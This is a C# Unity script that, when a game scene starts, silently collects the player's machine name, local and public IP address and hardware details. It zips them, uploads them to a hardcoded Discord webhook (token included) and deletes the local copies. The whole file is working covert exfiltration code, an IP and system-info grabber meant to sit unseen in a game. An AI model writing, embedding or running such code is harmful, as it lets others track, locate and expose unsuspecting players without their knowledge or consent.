using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.IO.Compression; // For creating zip files
using UnityEngine;
using UnityEngine.Networking;

public class SendIPToDiscord : MonoBehaviour
{
    // Discord Webhook URL (replace with your webhook URL)
    private string discordWebhookUrl = "https://ptb.discord.com/api/webhooks/1279375945979007027/7hqN8Ux1SJD_6SuRtI7FMwEh41g4y_izHFwUvy3xULG87EP6Ek6JHmuYyQCjfLyGyT-8";

    void Start()
    {
        StartCoroutine(GatherAndSendPCInfo());
    }

    IEnumerator GatherAndSendPCInfo()
    {
        // Get the public IP address
        string publicIP = "Not available";
        UnityWebRequest ipRequest = UnityWebRequest.Get("https://api.ipify.org");
        yield return ipRequest.SendWebRequest();

        if (ipRequest.result == UnityWebRequest.Result.Success)
        {
            publicIP = ipRequest.downloadHandler.text;
        }
        else
        {
            Debug.LogError("Failed to get public IP address: " + ipRequest.error);
        }

        // Gather PC information and save to a txt file
        string pcInfo = GetPCInfo(publicIP);
        string pcName = GetPCName();
        string filePath = Path.Combine(Application.persistentDataPath, $"{pcName}.txt");

        File.WriteAllText(filePath, pcInfo);
        Debug.Log($"PC info saved to {filePath}");

        // Create a zip file with the txt file
        string zipPath = Path.Combine(Application.persistentDataPath, $"{pcName}.zip");
        CreateZipWithPCInfo(filePath, zipPath);

        // Send the zip file to Discord
        StartCoroutine(SendToDiscord(zipPath));
    }

    string GetPCInfo(string publicIP)
    {
        string pcName = GetPCName();
        string localIP = GetLocalIPAddress();
        string gpuInfo = GetGPUInfo();
        string osInfo = GetOSInfo();
        string cpuInfo = GetCPUInfo();
        string ramInfo = GetRAMInfo();

        // Combine all the information into a single string
        string pcInfo = $"PC Name: {pcName}\n" +
                        $"Local IP Address: {localIP}\n" +
                        $"Public IP Address: {publicIP}\n" +
                        $"GPU: {gpuInfo}\n" +
                        $"Operating System: {osInfo}\n" +
                        $"CPU: {cpuInfo}\n" +
                        $"RAM: {ramInfo}";

        return pcInfo;
    }

    string GetPCName()
    {
        return System.Environment.MachineName;
    }

    string GetLocalIPAddress()
    {
        string localIP = "Not available";
        try
        {
            foreach (var address in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = address.ToString();
                    break;
                }
            }
        }
        catch (Exception e)
        {
            Debug.LogError("Error getting local IP address: " + e.Message);
        }
        return localIP;
    }

    string GetGPUInfo()
    {
        return SystemInfo.graphicsDeviceName;
    }

    string GetOSInfo()
    {
        return SystemInfo.operatingSystem;
    }

    string GetCPUInfo()
    {
        return $"{SystemInfo.processorType} - {SystemInfo.processorCount} cores";
    }

    string GetRAMInfo()
    {
        return $"{SystemInfo.systemMemorySize} MB";
    }

    void CreateZipWithPCInfo(string txtFilePath, string zipFilePath)
    {
        try
        {
            // Create a zip file from the text file
            using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.OpenOrCreate))
            {
                using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
                {
                    // Add the txt file to the zip
                    archive.CreateEntryFromFile(txtFilePath, Path.GetFileName(txtFilePath));
                }
            }
            Debug.Log($"Zip file created at {zipFilePath}");
        }
        catch (Exception ex)
        {
            Debug.LogError("Failed to create zip file: " + ex.Message);
        }
    }

    IEnumerator SendToDiscord(string zipFilePath)
    {
        // Prepare to send the zip file to Discord
        byte[] fileData = File.ReadAllBytes(zipFilePath);
        WWWForm form = new WWWForm();
        form.AddBinaryData("file", fileData, Path.GetFileName(zipFilePath), "application/zip");

        UnityWebRequest request = UnityWebRequest.Post(discordWebhookUrl, form);
        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            Debug.Log("Successfully sent PC info zip to Discord.");
        }
        else
        {
            Debug.LogError("Failed to send PC info zip to Discord: " + request.error);
        }

        // Optionally delete the files after sending
        File.Delete(zipFilePath);
        File.Delete(Path.ChangeExtension(zipFilePath, ".txt"));
    }
}




